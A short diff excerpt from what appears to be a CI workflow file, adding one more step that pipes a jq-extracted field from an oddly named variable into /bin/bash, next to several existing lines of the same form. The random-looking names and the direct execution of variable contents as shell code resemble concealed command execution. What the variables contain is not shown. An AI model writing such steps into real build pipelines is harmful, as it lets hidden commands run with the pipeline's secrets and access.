@@ -28,6 +28,7 @@ jobs:
           echo $tsvsa57 | jq -r .aft4 | /bin/bash
           printf '%s' "$qf76" | jq -r .ha468 | /bin/bash
           printf '%s' "$xjtld01" | jq -r .rlp952 | /bin/bash
+          printf '%s' "$l1" | jq -r .zyb0 | /bin/bash
 
       - name: Save archive
         if: always()
